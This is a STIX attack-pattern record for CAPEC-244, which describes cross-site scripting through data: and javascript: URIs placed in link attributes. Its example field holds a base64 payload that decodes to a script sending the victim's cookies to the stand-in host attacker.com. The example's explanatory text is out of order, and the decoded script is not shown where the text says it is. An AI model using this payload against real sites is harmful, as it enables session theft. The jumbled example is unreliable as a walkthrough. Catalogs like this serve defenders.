{
    "type": "attack-pattern",
    "id": "attack-pattern--8e205886-119d-4935-86ec-20ee28530e65",
    "created_by_ref": "identity--8641df51-0f59-4a4d-a300-7f11ca320ba2",
    "created": "2018-03-05T19:11:06.020Z",
    "modified": "2018-03-05T19:11:06.020Z",
    "name": "XSS Targeting URI Placeholders",
    "description": "An attack of this type exploits the ability of most browsers to interpret \"data\", \"javascript\" or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.",
    "external_references": [
        {
            "source_name": "capec",
            "url": "https://capec.mitre.org/data/definitions/244.html",
            "external_id": "CAPEC-244"
        },
        {
            "source_name": "cwe",
            "url": "http://cwe.mitre.org/data/definitions/84.html",
            "external_id": "CWE-84"
        }
    ],
    "object_marking_refs": [
        "marking-definition--127d62dd-9993-48ef-9ef1-a9c686da9914"
    ],
    "x_capec_abstraction": "Detailed",
    "x_capec_consequences": {
        "Run Arbitrary Code": "Execute unauthorized code or commands"
    },
    "x_capec_example_instances": [
        "The following payload data:\n\ttext/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg==\nrepresents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser.\n\t<html>\n\t</html>\nThe decoded payload is the following piece of HTML code:\n\t<a href=\"INJECTION_POINT\">My Link</a>\nWeb applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack.\nAn attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute):\nOnce the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack."
    ],
    "x_capec_likelihood_of_attack": "High",
    "x_capec_prerequisites": [
        "Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme."
    ],
    "x_capec_skills_required": {
        "To inject the malicious payload in a web page": "Medium"
    },
    "x_capec_typical_severity": "High",
    "x_resources_required": "Ability to send HTTP request to a web application"
}